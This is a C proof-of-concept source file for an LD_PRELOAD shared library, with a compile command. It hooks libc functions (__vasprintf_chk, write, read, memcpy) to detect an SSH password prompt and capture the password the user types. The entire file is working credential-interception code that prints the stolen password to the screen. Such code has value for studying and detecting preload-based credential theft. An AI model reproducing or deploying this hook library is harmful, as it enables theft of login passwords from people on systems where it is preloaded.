#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>

#define PASSWORD_LEN 1024
#define PASSWORD_DETECTED 1
#define PASSWORD_FMT "%s@%s's password: "
#define PASSWORD_WRITE_SUBSTR "'s password: "

int password_detected = 0;
char pass[PASSWORD_LEN];
char *cur = pass;

// Compile:
// gcc poc.c -o poc.so -fPIC -shared -ldl -D_GNU_SOURCE

// hook __vasprintf_chk() function for pre password reading detection
int __vasprintf_chk (char **__restrict __ptr, int __flag, const char *__restrict __fmt, __gnuc_va_list __arg) {
    if (strcmp(__fmt, PASSWORD_FMT) == 0) {
        password_detected = PASSWORD_DETECTED;
        printf("[HOOK __vasprintf_chk] %s\n", __fmt);
    }
    int (*__vasprintf_chk_real)(char **__restrict __ptr, int __flag, const char *__restrict __fmt, __gnuc_va_list __arg);
    __vasprintf_chk_real = dlsym(RTLD_NEXT, "__vasprintf_chk");
    return __vasprintf_chk_real(__ptr, __flag, __fmt, __arg);
}

// hook write() libc wrapper for pre password reading detection
ssize_t write (int __fd, const void *__buf, size_t __n) {
    if (strstr(__buf, PASSWORD_WRITE_SUBSTR) != NULL) {
        password_detected = PASSWORD_DETECTED;
        printf("[HOOK write] %s\n", (char*)__buf);
    }
    ssize_t (*libc_write)(int __fd, const void *__buf, size_t __n);
    libc_write = dlsym(RTLD_NEXT, "write");
    return libc_write(__fd, __buf, __n);
}

// hook read() libc wrapper for password reading
ssize_t read (int __fd, void *__buf, size_t __nbytes) {
    ssize_t (*libc_read)(int __fd, const void *__buf, size_t __nbytes);
    ssize_t result;
    libc_read = dlsym(RTLD_NEXT, "read");
    result = libc_read(__fd, __buf, __nbytes);
    if (PASSWORD_DETECTED == password_detected) {
        if ('\n' == *(char*)__buf ) {
            password_detected = 0;
            printf("\n[HOOK read] password is: %s\n", pass);
        }
        else {
            *cur = *(char*)__buf;
            cur++;
        }
    }
    return result;
}

// hook memcpy() function for password reading
void * memcpy (void *__restrict __dest, const void *__restrict __src, size_t __len) {
    if (PASSWORD_DETECTED == password_detected) {
        password_detected = 0;
        printf("[HOOK memcpy] %s\n", (char*)__src);
    }
    void * (*libc_memcpy)(void *__restrict __dest, const void *__restrict __src, size_t __len);
    libc_memcpy = dlsym(RTLD_NEXT, "memcpy");
    return libc_memcpy(__dest, __src, __len);
}